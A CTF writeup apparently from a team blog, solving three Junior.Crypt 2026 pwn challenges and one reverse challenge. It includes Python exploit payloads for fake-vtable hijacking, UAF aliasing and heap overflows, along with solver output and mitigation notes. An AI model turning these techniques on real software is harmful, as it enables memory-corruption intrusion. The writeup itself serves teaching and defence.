---
title: "Junior.Crypt 2026 Pwn + Reverse Writeup: 4 Challenges Solved (Cookie-Encoded Function Pointers, UAF Type Confusion, Heap Overflow with Reclassify, TCC-Injected VM)"
slug: "junior-crypt-2026-pwn-reverse-writeup"
description: "Step-by-step Junior.Crypt 2026 pwn and reverse writeup — three pwn challenges (Clockwork Vault: negative-index array bug + service-cookie-encoded function pointers; House of Mirage: session-to-sink UAF type confusion with pipelined race + fake vtable; Museum of Echoes: reclassify without realloc + heap overflow into adjacent exhibit's routine ptr) and one reverse challenge (Write The Кодэ: modified TCC compiler smuggles a hidden C source with a 512-byte VM blob decrypted by an ELF-relocation-derived key)."
date: 2026-07-15T12:15:00Z
lastmod: 2026-07-15T12:15:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
series: ["Junior.Crypt 2026"]
tags:
  - "junior.crypt"
  - "junior.crypt 2026"
  - "grodno ctf"
  - "ctf writeup"
  - "pwn"
  - "reverse engineering"
  - "negative index array oob"
  - "service cookie xor encoding"
  - "use after free"
  - "type confusion"
  - "vtable hijack"
  - "heap overflow"
  - "reclassify without realloc"
  - "tcc compiler backdoor"
  - "elf relocation key"
  - "vm bytecode reverse"
keywords:
  - "junior.crypt 2026 pwn writeup"
  - "junior.crypt 2026 reverse writeup"
  - "grodno ctf pwn writeup"
  - "clockwork vault writeup"
  - "house of mirage writeup"
  - "museum of echoes writeup"
  - "write the kode writeup"
  - "negative index bounds check bypass ctf"
  - "cookie encoded function pointer xor decode"
  - "session sink type confusion uaf ctf"
  - "sink vtable hijack fake vtable inside object"
  - "reclassify object heap overflow adjacent chunk"
  - "modified tcc compiler injects hidden source"
  - "elf relocation table key derivation vm decrypt"
  - "byte-by-byte reversible vm check ctf"
  - "ctf pwn step by step 2026"
toc: true
cover:
  image: "/images/articles/junior-crypt-2026-pwn-reverse-writeup.png"
  alt: "Junior.Crypt 2026 pwn + reverse writeup — four challenges solved covering negative-index array OOB with cookie-encoded function pointers, session-to-sink UAF type confusion with pipelined race and fake vtable, reclassify-without-realloc heap overflow into adjacent exhibit's routine pointer, and a modified TCC compiler that smuggles a hidden C source with a 512-byte VM blob decrypted by an ELF-relocation-derived key"
---

Junior.Crypt 2026 (grodno flag prefix) shipped a pwn track with three challenges that each turn a small logic mistake into a controlled indirect call: Clockwork Vault gates its "hidden" slots behind a bounds check that forgets to reject negative indexes, and encodes function pointers with a per-process cookie that leaks through the same primitive; House of Mirage recycles expired session chunks into a sink freelist but leaves the session-table pointer dangling, creating a type-confusion window where a `mirror import session profile` write rebuilds a live sink's vtable pointer against a fake vtable planted inside the object; Museum of Echoes reclassifies a small 0x50-byte "whisper" as a large 0xb0-byte "chorus" without reallocating, so the "chorus"-shaped `rewrite` handler writes 0x5f bytes past the end and stomps the next exhibit's routine pointer. The reverse challenge, Write The "Кодэ", ships a statically-linked modified TCC compiler that silently injects a hidden 5884-byte C source containing a 512-byte encrypted `vm_blob` and a `relocation_key()` function that derives its decryption key from the compiled binary's ELF `.rela.*` entries; recovering the VM and inverting its per-byte state machine yields the flag.

This is the pwn + reverse writeup for the event. Handouts, per-challenge READMEs, and pure-stdlib Python solvers live at [Abdelkad3r/Junior.Crypt.2026-CTF](https://github.com/Abdelkad3r/Junior.Crypt.2026-CTF). Every solve reduces to a fresh-instance one-shot once the load-bearing primitive is named.

## The four Junior.Crypt 2026 pwn + reverse challenges

| Challenge | Category | Bug class / primitive | Flag |
|---|---|---|---|
| Clockwork Vault | Pwn | Menu binary with 10 slots (2 hidden + 8 visible). `inspect` / `retune` compute `slots[(idx + 2) * 0x20]`; upper bound is checked but negative `idx` is not. `inspect(-2)` leaks `service_cookie`; `inspect(0)` leaks `cookie XOR trigger_alarm`. `retune(-1, ...)` writes both the maintenance gate and the encoded routine pointer, so option 3 (`cycle`) decodes and calls attacker-controlled code. `open_vault` sits at a small delta after `trigger_alarm`; scan `+0x00..+0x40` for the right offset. | `grodno{cb57fc15-7db2-4cb4-b624-b456b538b76a}` |
| House of Mirage | Pwn | Session/sink type confusion. Expired sessions are moved to an archive freelist but their session-table pointer stays live; new sinks reuse archived session chunks. `show session` on the stale slot reads the sink's vtable pointer (PIE leak); `mirror import session profile` copies 0x60 bytes into the object via the stale pointer, rebuilding the sink's vtable pointer to point at a fake vtable planted inside the object at offset 0x10. `flush sink` dispatches through the fake vtable into the hidden flag routine at PIE+0x3970. Pipelined create-show-rearm burst beats the archive scan race. | `grodno{cd79ec7a-8579-454d-adea-6ceacc7590d7}` |
| Museum of Echoes | Pwn | Reclassify without realloc. `whisper` (0x50 bytes, kind=1) and `chorus` (0xb0 bytes, kind=2) share a routine pointer at +0x10 and a gate field. `reclassify_exhibit()` toggles the kind field and routine but keeps the small allocation; `rewrite_exhibit()` trusts the kind field, so a reclassified whisper accepts 0x5f bytes at +0x50 (0xf bytes past its own end), straight into the next exhibit's fields. Corrupt slot 1's `gate = 0x4543484f` and `routine = grand_finale`; slot 1's `perform` calls the hidden flag routine. `grand_finale = chorus_perform + 0x3d` on the live service. | `grodno{128dd3b9-d0e3-4332-960d-d3dcda20791b}` |
| Write The "Кодэ" | Reverse | Modified statically-linked `tcc` binary smuggles a hidden 5884-byte C source into any compilation of `checker.c`. The hidden source contains a 512-byte `vm_blob` and a `relocation_key()` function that opens `/proc/self/exe`, walks all `SHT_RELA` sections, and derives a 64-bit key by folding each `Elf64_Rela` record through a rotate-multiply-XOR mix seeded at `0x6a09e667f3bcc909`. Key `0xe168ed20290a5b17` decrypts the VM to `33 00 51 ...` = 51 input bytes + 51 seven-byte records `a7 <salt> <rotation> <wanted_state_le32>`. Per-byte state machine reversible in Python: `input[i] = (previous_state XOR ror32(wanted - (0x9e3779b9 XOR i*0x45d9f3b), rotation)) - salt`. | `grodno{Fabrice_Bellard_is_a_really_cool_programmer}` |

The pattern that ties the pwn track together: each challenge exposes a data-dependent indirect call (`slots[1].encoded_action`, sink vtable, exhibit routine pointer) that can be steered to a hidden flag function once the exploit obtains (a) a live code-pointer leak, and (b) a write primitive that reaches the pointer. The mitigation stack (PIE, NX, canaries, RELRO) is present but irrelevant because the exploits never touch the stack; every hijack lives in the heap or in a global slot array. The single reverse challenge is a different shape (the primitive is "the compiler is the malware"), but the payoff of the primitive (the byte-by-byte state machine) is trivially reversible once recovered.

## Methodology — find the indirect-call target, then find the write

A pattern that worked across all three pwn challenges: identify the hidden flag function first (all three binaries contain one, all three name it in the symbol table: `open_vault`, `[mirage] archive replay unlocked` sitting inside a 0x3970 function, `grand_finale`), then identify every indirect call in the reachable menu code and trace back to what writes to its target. For Clockwork Vault the indirect call is `cycle()`'s `routine = cookie XOR slots[1].encoded_action; routine();`, and the write is `retune(-1, ...)`. For House of Mirage the indirect call is `flush_sink`'s `call qword ptr [vtable]`, and the write is `mirror_import` copying through the stale session pointer. For Museum of Echoes the indirect call is `perform_exhibit`'s `obj->routine(obj)`, and the write is `rewrite_exhibit`'s type-confused 0x5f-byte OOB. Every solve is a matter of composing the two primitives.

The second discipline is being aggressive about handling deployment skew. All three pwn challenges had the same "handout addresses don't match the remote" issue that comes up in almost every deployed CTF challenge. The fix is always the same: leak a live code pointer from the remote process (a cookie-encoded pointer, a live vtable, a normal routine field), compute the delta to the hidden flag function using the handout as a rough map, and scan a small window if the delta itself has moved. For Clockwork Vault the winning delta was `+0x15`; for Museum of Echoes it was `+0x3d`; for House of Mirage the layout was stable and the leaked vtable was enough.

Per-challenge walkthroughs follow.

## 1. Clockwork Vault (pwn)

A menu-driven binary with a 10-slot array. The two hidden slots at indexes 0 and 1 hold sensitive data (a service cookie and an encoded maintenance routine pointer), but the menu handlers `inspect` and `retune` only reject `idx > 7`, not negative indexes. Passing `idx = -2` reads the service cookie; passing `idx = -1` writes the maintenance slot; the maintenance cycle then dispatches an XOR-decoded function pointer.

#### Step 1 — Read the slot layout

```c
struct slot {
    char name[16];
    uint64_t setting;
    uint64_t encoded_action;
};

slot slots[10];
```

`setup()` initialises:

```c
service_cookie = 0x3141592653589793 ^ ((uintptr_t)slots >> 12);

slots[0].setting = service_cookie;
slots[1].encoded_action = service_cookie ^ idle_cycle;

for (int i = 2; i <= 9; i++)
    slots[i].encoded_action = service_cookie ^ trigger_alarm;
```

`slots[0]` is `service-key` (holds the cookie), `slots[1]` is `maint-core` (holds the maintenance routine), `slots[2..9]` are the eight user-visible mechanisms.

#### Step 2 — Spot the bounds bug

Both `inspect_slot()` and `retune_slot()` do:

```asm
call read_int
cmp  DWORD PTR [rbp-0x4], 0x7
jle  ok
puts("No such mechanism.")
...
ok:
    slot = &slots[(idx + 2) * 0x20]
```

Signed compare (`jle`), upper bound only. Negative `idx` sails past and reaches the hidden slots via `(idx + 2)`:

```
idx = -2  ->  slots[0]  (service-key)
idx = -1  ->  slots[1]  (maint-core)
```

#### Step 3 — Leak the cookie

```
> 1
Mechanism index: -2

Name: service-key
Setting: 0x3141592653589397
Encoded routine: 0x0
```

`service_cookie = 0x3141592653589397`.

#### Step 4 — Leak trigger_alarm

Any visible mechanism reveals a `cookie XOR trigger_alarm`:

```
> 1
Mechanism index: 0

Name: escapement
Setting: 0xb
Encoded routine: 0x3141592653188058
```

Decode:

```python
trigger_alarm = service_cookie ^ 0x3141592653188058
              = 0x4013cf   (on the live instance)
```

#### Step 5 — Retune the maintenance core

The maintenance cycle requires a magic setting before dispatching:

```c
void cycle(void) {
    if (slots[1].setting != 0x43414c4942524154) return;
    void (*routine)(void) = service_cookie ^ slots[1].encoded_action;
    routine();
}
```

`retune(-1, magic, cookie ^ target)` writes both fields:

- setting = `0x43414c4942524154` (the magic, ASCII `"CALIBRAT"` back-to-front)
- encoded_action = `cookie ^ open_vault`

#### Step 6 — Handle the layout skew

The handout binary and the live service had slightly different offsets between `trigger_alarm` and `open_vault`. Rather than hardcoding, the solver scans `+0x00..+0x40` in a fresh connection per candidate delta, retuning and cycling until the output contains `grodno{...}`. Live delta was `+0x15`:

```
$ python3 solve.py 10.112.0.12 46429
[+] service_cookie: 0x3141592653589397
[+] trigger_alarm:  0x4013cf
[+] open_vault delta: +0x15
[+] flag: grodno{cb57fc15-7db2-4cb4-b624-b456b538b76a}
```

Per-challenge README + solver: [pwn/clockwork-vault](https://github.com/Abdelkad3r/Junior.Crypt.2026-CTF/tree/main/pwn/clockwork-vault).

The take-home for defenders: XOR-encoding function pointers is only worth its bytes if the encoding key is not readable through the same primitive. Here the pointer-encoding cookie shares a slot table with the encoded pointers, and the same missing-lower-bound check exposes both. If the cookie lived in a separate structure with its own bounds check, the exploit would need a genuine secondary primitive; as shipped, one bounds bug yields both leak and write.

## 2. House of Mirage (pwn)

A session broker with an "archive replay" feature. Sessions and sinks are two different object types allocated at the same size class. When a session expires, its chunk is scrubbed and placed on an archive freelist but its session-table pointer is left dangling. New sink allocations pull from that freelist, so a stale session and a live sink end up as two names for the same heap object. `show session` on the stale slot leaks the sink's vtable pointer; `mirror import session profile` writes 0x60 bytes into the object via the stale pointer, rewriting the live sink's vtable and planting a fake vtable inside the same object.

#### Step 1 — Find the hidden flag function

Static analysis shows a function at PIE offset `0x3970` that prints `[mirage] archive replay unlocked` followed by `flag.txt`. No direct call to it exists in the reachable menu code. The only interesting indirect call is in `flush_sink`:

```asm
mov rdi, [sink_table + id * 8]
mov rsi, message
mov rax, [rdi]              ; sink->vtable
call qword ptr [rax]        ; vtable[0]
```

So if we can (a) leak PIE base and (b) point a sink's vtable at controlled memory whose first qword is `pie_base + 0x3970`, `flush sink` becomes the flag call.

#### Step 2 — Trigger the archive UAF alias

Option 5 arms a session's expiry. Setting it to 0 seconds makes the background thread sweep the session immediately: free the scratchpad, scrub with 0xa5, link the chunk into the archive freelist. The session-table pointer stays live.

Create a sink (option 6). The allocator pulls from the archive freelist first, so the sink lands on the archived session's memory. Both tables now point at the same address:

```
active sessions:
  [0] 0x62d4c1c8b600
active sinks:
  [0] 0x62d4c1c8b600
```

#### Step 3 — Leak the sink vtable via the stale session

`show session` reads the object as if it were a session, printing the first qword as `session.serial`. For a real sink at that address, the first qword is `sink->vtable`:

```
serial: 0x62d487ded030
```

Normal sink vtable offset in the PIE image is `0x6030`, so:

```python
pie_base = leaked_vtable - 0x6030
flag_func = pie_base + 0x3970
```

Telemetry (option 9) gives the heap address of the aliased object, so we know exactly where a fake vtable planted inside it will sit:

```python
heap_obj = 0x62d4c1c8b600
fake_vtable = heap_obj + 0x10
```

#### Step 4 — Beat the archive race with a pipelined burst

After the sink is created on top of the archived session, the background thread can still see the stale session pointer and try to archive it a second time. If that happens before we finish the leak + write, the first qword becomes `0xa5a5a5a5a5a5a5a5` and we lose.

Pipeline the critical operations in one `send()`:

```python
payload = (
    b"6\n" + label + b"\n"                          # create sink
    b"2\n" + str(sid).encode() + b"\n"              # show session (leak vtable)
    b"5\n" + str(sid).encode() + b"\n9999\n"        # re-arm session far in future
)
```

The re-arm at the end keeps the object alive long enough to finish the corruption.

#### Step 5 — Corrupt the sink vtable via mirror import

Option 3 `mirror import session profile` takes a session id, a blob length up to 0x60, and copies the blob directly over the session object:

```python
blob = bytearray(0x60)
blob[0x00:0x08] = p64(fake_vtable)              # sink->vtable
blob[0x08:0x10] = p64(int(time.time()) + 9999)  # keep expiry safe
blob[0x10:0x18] = p64(flag_func)                # fake_vtable[0]
```

Now `sink->vtable = heap_obj + 0x10`, and the value at `heap_obj + 0x10` is `flag_func`. `flush_sink` reads `sink->vtable`, dereferences the fake vtable inside the object, and calls the flag function.

#### Step 6 — Fire

```
$ python3 solve.py 10.112.0.12 40798
[*] session[0] == sink[0]
[*] sink/session alias: 0x62d4c1c8b600
[*] vtable=0x62d487ded030 pie=0x62d487de7000 flag_func=0x62d487dea970
[*] fake vtable at 0x62d4c1c8b610

[mirage] archive replay unlocked
grodno{cd79ec7a-8579-454d-adea-6ceacc7590d7}
```

Per-challenge README + solver: [pwn/house-of-mirage](https://github.com/Abdelkad3r/Junior.Crypt.2026-CTF/tree/main/pwn/house-of-mirage).

The pattern is a classic type-confusion UAF, and the mitigation is a matching pair: when an object is freed, its every outstanding reference must be nulled (session table pointer here should have gone to zero the moment the chunk was archived), and the freelist must not cross allocation-type boundaries (session-shaped allocations should not be reusable as sinks). Either fix independently closes the exploit; the challenge author left both open.

## 3. Museum of Echoes (pwn)

Two exhibit types share a routine-pointer layout: `whisper` at 0x50 bytes with kind=1, `chorus` at 0xb0 bytes with kind=2. `reclassify_exhibit()` changes the `kind` field and routine pointer but never reallocates. `rewrite_exhibit()` trusts the kind field and writes chorus-sized payloads into whisper-sized chunks, which is a 0x5f-byte OOB into whatever object sits next on the heap.

#### Step 1 — Enumerate the two exhibit shapes

```c
struct whisper {
    int kind;             // +0x00, value 1
    uint64_t gate;        // +0x08
    void (*routine)();    // +0x10  -> whisper_perform
    char label[...];      // +0x18
    char line[0x20];      // +0x30
};                        // sizeof = 0x50

struct chorus {
    int kind;             // +0x00, value 2
    uint64_t gate;        // +0x08
    void (*routine)();    // +0x10  -> chorus_perform
    char label[...];      // +0x18
    char intro[0x20];     // +0x30
    char refrain[0x60];   // +0x50
};                        // sizeof = 0xb0
```

`inspect_exhibit` leaks the routine pointer:

```
Label: chorus
Routine: 0x4012cb
```

That's the live `chorus_perform` address on the deployed instance.

#### Step 2 — Find the reclassify bug

```c
gallery[slot]->kind = new_kind;
gallery[slot]->gate = 0x4543484f;
if (new_kind == 1)  gallery[slot]->routine = whisper_perform;
else                gallery[slot]->routine = chorus_perform;
```

No realloc. Now `rewrite_exhibit()` trusts the kind field:

```c
if (obj->kind == 2) {
    read_blob(obj + 0x30, 0x1f);   // intro
    read_blob(obj + 0x50, 0x5f);   // refrain
}
```

For a reclassified whisper, `obj + 0x50` is one byte past the 0x50-byte allocation. The 0x5f-byte `refrain` write goes straight into the next heap object.

#### Step 3 — Plan the OOB write

Layout when we create whisper in slot 0, then chorus in slot 1:

```
[slot0 whisper 0x50] [chunk header] [slot1 chorus 0xb0]
```

After reclassifying slot 0 as chorus and rewriting its refrain, the 0x5f-byte write hits:

- bytes 0x00-0x08: fake `prev_size` in the next chunk's header
- bytes 0x08-0x10: fake `size` (keep it plausible as 0x61)
- bytes 0x10-0x14: slot 1's `kind` field (need to keep valid)
- bytes 0x18-0x20: slot 1's `gate`
- bytes 0x20-0x28: slot 1's `routine`

The gate check in `perform_exhibit` requires `gate == 0x4543484f` (ASCII "ECHO" back-to-front); the routine pointer is called as `obj->routine(obj)`.

```python
overflow = bytearray(b"X" * 0x5f)
overflow[0:8] = p64(0)                    # prev_size
overflow[8:16] = p64(0x61)                # size
overflow[16:20] = struct.pack("<I", 1)    # slot1.kind
overflow[24:32] = p64(0x4543484f)         # slot1.gate
overflow[32:40] = p64(grand_finale)       # slot1.routine
overflow[40:46] = b"owned\x00"            # slot1.label
```

Slot 1 is never freed after corruption, so the fake chunk header only needs to be quiet for the current execution path; a plausible non-zero size does the trick.

#### Step 4 — Locate grand_finale on the live service

The handout's `grand_finale` symbol was not at the same offset on the remote. The solver leaks `chorus_perform` from the live inspect, then adds `+0x3d` (empirically determined from local calibration + a short probe over nearby code addresses):

```python
grand_finale = chorus_perform + 0x3d
```

#### Step 5 — Fire

```
$ python3 solve.py 10.112.0.12 41486
[*] chorus_perform: 0x4012cb
[*] grand_finale:   0x401308

Flag: grodno{128dd3b9-d0e3-4332-960d-d3dcda20791b}
```

Per-challenge README + solver: [pwn/museum-of-echoes](https://github.com/Abdelkad3r/Junior.Crypt.2026-CTF/tree/main/pwn/museum-of-echoes).

The bug class is one of the classic heap-hardening anti-patterns: two object shapes glued together by an in-object `kind` tag, with mutation handlers that trust the tag rather than the underlying allocation size. The fix is either to reallocate on reclassify (safe but slow), reject reclassify when the sizes differ (safest), or maintain the allocation size alongside the tag and enforce it at every mutation site. The general lesson generalises to any tagged-union in a language without runtime type checks: the tag is data, and any mutation that trusts it without corroboration is a type-confusion bug waiting to happen.

## 4. Write The "Кодэ" (reverse)

The handout ships a modified statically-linked `tcc` compiler alongside a boring `checker.c` that references an undefined `audit()` function. Running `./tcc -B./runtime checker.c -o checker` produces a working binary because the compiler silently injects a hidden 5884-byte C source containing `audit()`, a 512-byte encrypted `vm_blob`, and a `relocation_key()` function whose decryption key comes from the *compiled* binary's ELF relocation table.

#### Step 1 — Read the visible checker

```c
extern int audit(const char *answer);

int main(void) {
    char answer[128];
    puts("Build provenance check");
    fputs("receipt: ", stdout);
    if (!fgets(answer, sizeof answer, stdin)) return 1;
    answer[strcspn(answer, "\n")] = 0;
    puts(audit(answer) ? "accepted" : "rejected");
    return 0;
}
```

No `audit()` in `checker.c`; no `audit()` in `libtcc1.a`. The challenge tagline is literal: the important behaviour is introduced by changing the compiler.

#### Step 2 — Extract the hidden source from tcc

The `tcc` binary is a statically-linked stripped ELF. `strings tcc | grep -E 'checker.c|audit'` surfaces two references that shouldn't be inside any compiler. Around the `audit` string, a full C source file starts with `#include <stdint.h>` and defines:

```c
static volatile unsigned char vm_blob[512] = { ... };
```

That is the entire hidden verifier, ~5884 bytes long. The custom `tcc` recognises the challenge `checker.c` at compile time and splices this source in as if it were a linked library.

#### Step 3 — Read relocation_key()

```c
static uint64_t relocation_key(void) {
    Elf64_Ehdr eh;
    Elf64_Shdr sh;
    Elf64_Rela rela;
    uint64_t key = 0x6a09e667f3bcc909ULL;   // SHA-256 IV word 0
    int fd = open("/proc/self/exe", O_RDONLY);
    ...
    for each SHT_RELA section:
        for each Elf64_Rela entry:
            key ^= rela.r_info + 0x9e3779b97f4a7c15ULL
                   + ((uint64_t)section_index << 32) + rela_index;
            key = rotl64(key, 17) * 0xbf58476d1ce4e5b9ULL;
            key ^= (uint64_t)rela.r_addend;
    return key;
}
```

The starting seed is the SHA-256 IV; the mix constants are `0x9e3779b97f4a7c15` (SplitMix64 golden ratio) and `0xbf58476d1ce4e5b9` (SplitMix64 mix constant). Standard cryptographic-looking primitives applied to non-cryptographic data (ELF relocations).

The key is not a hidden secret; it is a deterministic function of the ELF that TCC produces. If we know the relocation table of the intended Linux build, we can compute the same key without ever running the binary.

#### Step 4 — Reproduce the key for the intended build

The intended Linux build produces an ELF with these dynamic relocation sections:

```
.rela.bss
.rela.got
.rela.plt
```

Feeding those `Elf64_Rela` records through `relocation_key()` gives:

```
seed = 0xe168ed20290a5b17
```

Sanity check: decrypt `vm_blob[0:3]` and it starts with `33 00 51`, which is `0x0033 = 51` input bytes and VM magic byte `0x51`.

#### Step 5 — Decrypt vm_blob and parse the records

```c
uint64_t seed = relocation_key();
for (i = 0; i < 512; i++)
    code[i] = vm_blob[i] ^ (unsigned char)(next_word(&seed) >> 56);
```

`next_word` is a SplitMix64 step. Decrypted layout:

```
0x00-0x02   header: 51 input bytes, magic 0x51
0x03-...    51 records, seven bytes each:
              a7 <salt> <rotation> <wanted_state_le32>
```

The `0xa7` opcode repeats once per input character.

#### Step 6 — Invert the per-byte state machine

```c
state = 0xC0DEC0DE;
for (i = 0; i < 51; i++) {
    state ^= input[i] + salt;
    state = rol32(state, rotation);
    state += 0x9e3779b9 ^ (i * 0x45d9f3b);
    if (state != wanted) reject;
}
```

Every step is reversible:

```python
before_add = wanted - (0x9e3779b9 ^ (i * 0x45d9f3b))
after_xor  = ror32(before_add, rotation)
character  = (previous_state ^ after_xor) - salt
```

Iterate for `i = 0..50` starting from `state = 0xC0DEC0DE`:

```
grodno{Fabrice_Bellard_is_a_really_cool_programmer}
```

(A nod to the author of TCC. Fabrice Bellard also wrote FFmpeg, QEMU, and holds a world record for pi computation.)

#### Step 7 — Run the solver

```
$ python3 solve.py
[+] hidden audit source: 5884 bytes
[+] vm_blob: 512 bytes
[+] seed: 0xe168ed20290a5b17
[+] decrypted VM length: 51
[+] flag: grodno{Fabrice_Bellard_is_a_really_cool_programmer}
```

Per-challenge README + solver: [reverse/write-the-kode](https://github.com/Abdelkad3r/Junior.Crypt.2026-CTF/tree/main/reverse/write-the-kode).

The trick is a two-layer hiding scheme: at source level, `audit()` is injected by a modified compiler only for the expected `checker.c`; at runtime level, the actual bytecode is encrypted with a key derived from the final ELF relocation order, which means a naive "just read the tcc binary" pass sees only encrypted bytes. Both layers fall to the same discipline as any other multi-stage packer: extract the layer's key material (here, the relocation-table key) from a known-good reference (the intended Linux build), decrypt, then apply the standard byte-by-byte VM reversal to the plaintext. The flag payload is the small joke on top of the real payload.

## Cross-cutting defender notes

Five patterns recur across the Junior.Crypt 2026 pwn + reverse track and translate directly into review heuristics.

**Cookie-XOR pointer encoding only works if the cookie is out of reach.** Clockwork Vault stores its pointer-encoding cookie in the same slot table that holds the encoded pointers, protected by the same bounds check that turns out to have a hole. If the cookie lived in a segregated structure with a dedicated getter, or in a stack canary style TLS slot, the exploit would need a genuinely different primitive to reach it. The general rule: any XOR-based obfuscation of code pointers must keep the XOR key on a code path that the write-primitive attacker cannot reach; otherwise it is a two-XOR speed bump, not a mitigation.

**Signed bounds checks silently permit negative indexes.** Clockwork Vault's `cmp DWORD PTR [rbp-0x4], 0x7 ; jle ok` checks the upper bound with a signed compare and doesn't reject negatives. The mechanical fix is to use `cmp eax, 0x8 ; jae fail` (unsigned above-or-equal), which catches both `< 0` and `> 7` in one instruction. Every menu-driven binary in a CTF is one signed-vs-unsigned mistake away from a hidden-slot leak; every real-world CVE tagged `CWE-190` starts from the same shape.

**Freed-object references must be nulled at the source, not just at the destination.** House of Mirage frees session chunks into an archive freelist but leaves the session-table pointer live. As soon as a sink allocation reuses that chunk, the session table becomes a shadow pointer into a live object of a different type: exactly the pattern that made every browser vtable-hijack CVE from 2015-2020. The fix is one line: on archive, set `session_table[i] = NULL`. The deeper fix is to keep allocation-type isolation: allocator arenas segregated by object class prevent freelist mixing across types, which is what glibc's per-thread-cache and Chromium's PartitionAlloc buckets do.

**Tagged unions must enforce size on every mutation, not just on the tag.** Museum of Echoes reclassifies a `whisper` (0x50 bytes) as a `chorus` (0xb0 bytes) by flipping a tag field, and then the rewrite handler trusts the tag and writes chorus-sized data into the whisper's allocation. The tag is data; the allocation size is data; the two must be corroborated at every mutation. The safest form is to disallow reclassification entirely (each object type gets its own type-scoped mutation API); the next-best is to require reclassify to reallocate; the weakest is to store the allocation size alongside the tag and check `sizeof(new_kind) <= alloc_size` on every mutation.

**Compiler-injected malware is a real supply-chain shape.** Write The "Кодэ" dramatises the classic Ken Thompson "Reflections on Trusting Trust" attack in miniature: a modified compiler smuggles code into a program that never mentions it. In the real world, this is the shape of the CCleaner supply-chain compromise (2017), the SolarWinds trojan (2020), the xz-utils backdoor (2024), and a handful of npm/PyPI malicious-package incidents each year. The reverse challenge here is deliberately soft (the compiler is provided, the injection is visible in `strings`, the encryption is reversible), but the pattern is worth internalising: a supplied build tool must be independently reproduced from source, or its output must be diffed against a known-good reference build. Neither is common practice; both should be.

## Frequently asked questions

### What is Junior.Crypt 2026?

Junior.Crypt is a Belarusian junior-tier CTF (hosted in Grodno; flag prefix `grodno{...}`). The 2026 edition ran categories including crypto, forensic, misc, osint, pwn, reverse, and web. This writeup covers the three pwn challenges (Clockwork Vault, House of Mirage, Museum of Echoes) and the one reverse challenge (Write The "Кодэ") that I solved. Per-challenge READMEs, handout binaries, and pure-stdlib Python solvers are mirrored at [Abdelkad3r/Junior.Crypt.2026-CTF](https://github.com/Abdelkad3r/Junior.Crypt.2026-CTF).

### How does Clockwork Vault leak the service cookie without smashing anything?

`inspect_slot()` and `retune_slot()` compute the target slot as `slots[(idx + 2) * 0x20]` and only reject `idx > 7`. A signed compare (`jle`) lets negative `idx` through. `inspect(-2)` reaches `slots[0]` (the hidden `service-key` slot), whose `setting` field is exactly the process-local `service_cookie = 0x3141592653589793 ^ ((uintptr_t)slots >> 12)`. Inspecting any visible mechanism additionally leaks `service_cookie ^ trigger_alarm`, so XOR-decoding gives the base address of a known function. `retune(-1, magic, cookie ^ open_vault)` writes the maintenance slot with the flag-function pointer, and option 3 (`cycle`) decodes and calls it.

### Why does the House of Mirage exploit not need a stack overflow?

The exploit lives entirely in the heap and the sink dispatch path. Sessions and sinks share an allocation size class; expired sessions are placed on an archive freelist but their session-table pointer stays live. A new sink allocation pulls from that freelist and reuses the archived session chunk, so `session_table[i]` and `sink_table[j]` end up pointing at the same object. `show session` on the stale slot reads the sink's vtable pointer (a live PIE address, leaking `pie_base = leaked_vtable - 0x6030`). `mirror import session profile` writes 0x60 bytes through the stale session pointer, rewriting the sink's vtable pointer to point at a fake vtable planted inside the same object at offset 0x10. `flush sink` dispatches through the fake vtable into the hidden flag routine at `pie_base + 0x3970`.

### What is the archive race in House of Mirage and how do you beat it?

After the archived session's chunk is reused as a sink, the background archive-sweep thread can still see the stale session-table pointer and try to archive the object a second time. If that happens between the leak and the write, the object's first qword gets scrubbed to `0xa5a5a5a5a5a5a5a5` and both the leak and the corruption fail. Beat it by pipelining the critical operations in one `send()`: create-sink → show-session (leak vtable) → re-arm-session-far-in-future. The re-arm at the end pushes the object's next archive candidacy out to 9999 seconds, keeping it alive long enough to finish the corruption.

### What is the reclassify-without-realloc bug in Museum of Echoes?

`whisper` is a 0x50-byte object with kind=1; `chorus` is a 0xb0-byte object with kind=2. `reclassify_exhibit()` changes the `kind` field and routine pointer but doesn't reallocate the object. `rewrite_exhibit()` trusts the kind field: for kind=2 it writes 0x1f bytes at +0x30 (intro) and 0x5f bytes at +0x50 (refrain). A whisper reclassified to chorus then accepts a 0x5f-byte write at +0x50, or 0xf bytes past its own 0x50-byte allocation. That overflow lands in the adjacent heap chunk (the next exhibit's malloc metadata + fields). Setting slot 1's `gate = 0x4543484f` and `routine = grand_finale` makes slot 1's `perform` call the hidden flag function.

### How did you find grand_finale's exact address on the live service?

The handout binary and the remote service had slightly different offsets between adjacent functions. `inspect_exhibit` on a live chorus leaks `chorus_perform`; from the local calibration, `grand_finale = chorus_perform + 0x3d` on the deployed instance. The general technique is to leak any live code pointer, then reason about relative offsets rather than absolute addresses. Local calibration on the handout narrows the search space to a small window, and a short probe over nearby code confirms the exact delta.

### How does the modified TCC compiler inject the hidden audit function?

The provided `tcc` binary is a statically-linked stripped ELF. Running `strings tcc | grep -E 'checker.c|audit'` surfaces two references that shouldn't be in any compiler. Around the `audit` reference, a complete C source file is embedded, starting with `#include <stdint.h>` and containing `static volatile unsigned char vm_blob[512] = { ... }` plus the full `audit()` and `relocation_key()` implementations. When `tcc` is invoked with the challenge `checker.c`, it recognises the file (probably by filename + AST signature) and splices this hidden source into the translation unit as if it were an implicitly-linked library, satisfying the `extern int audit(const char *)` reference at link time.

### What is the ELF relocation key in Write The "Кодэ"?

The hidden verifier defines `relocation_key()` which opens `/proc/self/exe`, walks all `SHT_RELA` sections, and folds each `Elf64_Rela` record into a 64-bit key seeded at the SHA-256 IV word `0x6a09e667f3bcc909`. Each record adds `r_info + 0x9e3779b97f4a7c15 + (section_idx << 32) + rela_idx` to the key, rotates left by 17, multiplies by `0xbf58476d1ce4e5b9`, and XORs in `r_addend`. The key is therefore a deterministic function of the final ELF's relocation order, so a naive "just read the tcc binary" pass sees `vm_blob` as encrypted bytes; only compiling `checker.c` and running it (or reproducing the relocation walk offline against the intended Linux build) yields the key `0xe168ed20290a5b17` needed to decrypt the VM.

### How does the per-byte VM check invert?

Decrypted `vm_blob` starts with a header (`33 00 51` = 51 input bytes, magic byte 0x51) followed by 51 seven-byte records `a7 <salt> <rotation> <wanted_state_le32>`. The verifier iterates:

```
state = 0xC0DEC0DE
for i in 0..51:
    state ^= input[i] + salt
    state = rol32(state, rotation)
    state += 0x9e3779b9 ^ (i * 0x45d9f3b)
    require state == wanted
```

